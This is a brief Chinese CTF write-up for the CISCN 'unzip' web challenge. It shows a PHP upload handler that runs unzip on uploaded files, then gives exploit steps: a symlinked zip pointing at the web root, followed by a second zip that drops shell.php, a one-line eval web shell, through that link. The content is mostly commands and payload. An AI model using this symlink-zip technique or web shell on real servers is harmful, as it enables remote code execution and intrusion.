---
title: CISCN Web unzip writeup 
tags: [Linux,WebSec,CTF]
categories: [CTF]
---

## CISCN Web unzip writeup


### 0x01 题目描述

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);

$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};

//only this! 
```

`ln -s var/www/html link`

`zip --symlinks link.zip link`

删除文件link


新建目录link
`mkdir link`

`cd link`

`cat shell.php`

<?php eval($_REQUEST[1]);phpinfo();?>

`cd ..`

`zip -r demo.zip link/`



